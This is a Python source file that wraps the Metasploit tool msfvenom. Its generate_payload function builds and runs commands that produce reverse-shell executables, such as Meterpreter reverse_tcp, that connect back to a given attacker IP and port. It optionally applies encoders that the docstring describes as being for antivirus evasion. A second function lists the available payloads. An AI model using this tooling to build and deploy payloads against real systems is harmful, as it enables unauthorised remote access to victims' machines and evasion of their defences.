"""Payload generation tool (msfvenom wrapper)"""
import subprocess
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

def generate_payload(
    payload_type: str,
    lhost: str,
    lport: int = 4444,
    output_file: str = "payload.exe",
    format: str = "exe",
    encoder: str = None,
    iterations: int = 1
) -> dict:
    """Generate payload using msfvenom
    
    Args:
        payload_type: Payload type (e.g., windows/meterpreter/reverse_tcp)
        lhost: Attacker IP
        lport: Attacker port
        output_file: Output filename
        format: Output format (exe, elf, raw, etc.)
        encoder: Encoder for AV evasion (e.g., x86/shikata_ga_nai)
        iterations: Encoding iterations
        
    Returns:
        dict with status and path
    """
    try:
        # Build msfvenom command
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format,
            "-o", output_file
        ]
        
        # Add encoder if specified
        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])
        
        logger.info(f"Generating payload: {' '.join(cmd)}")
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if result.returncode == 0:
            output_path = Path(output_file)
            if output_path.exists():
                return {
                    "success": True,
                    "path": str(output_path.absolute()),
                    "size": output_path.stat().st_size,
                    "message": f"Payload generated: {output_file}"
                }
        
        return {
            "success": False,
            "error": result.stderr,
            "message": "Payload generation failed"
        }
        
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Timeout after 60 seconds",
            "message": "Payload generation timed out"
        }
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        return {
            "success": False,
            "error": str(e),
            "message": "Payload generation failed"
        }

def list_payloads(platform: str = None) -> dict:
    """List available payloads
    
    Args:
        platform: Filter by platform (windows, linux, android, etc.)
        
    Returns:
        dict with payload list
    """
    try:
        cmd = ["msfvenom", "--list", "payloads"]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            payloads = []
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line and not line.startswith('Framework') and not line.startswith('Name'):
                    if platform:
                        if platform.lower() in line.lower():
                            payloads.append(line.split()[0])
                    else:
                        if '/' in line:
                            payloads.append(line.split()[0])
            
            return {
                "success": True,
                "payloads": payloads,
                "count": len(payloads)
            }
        
        return {
            "success": False,
            "error": result.stderr
        }
        
    except Exception as e:
        logger.error(f"List payloads failed: {e}")
        return {
            "success": False,
            "error": str(e)
        }
